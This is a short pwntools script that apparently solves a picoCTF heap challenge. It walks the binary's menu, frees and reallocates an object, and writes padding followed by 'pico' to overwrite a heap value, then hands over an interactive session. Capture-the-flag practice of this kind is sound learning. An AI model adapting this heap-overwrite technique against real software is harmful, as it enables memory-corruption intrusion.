#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("tethys.picoctf.net", 59967)

    return r


def main():
    r = conn()

    r.recvuntil(b"Enter your choice: ")
    r.sendline(b'5')
    r.recvuntil(b'Enter your choice: ')
    r.sendline(b'2')
    r.recvuntil(b'Size of object allocation: ')
    r.sendline(b'35')
    r.recvuntil(b'Data for flag: ')
    r.sendline(b'A'*30 + b'pico')
    r.recvuntil(b"Enter your choice: ")
    r.sendline(b'4')
    r.interactive()


if __name__ == "__main__":
    main()
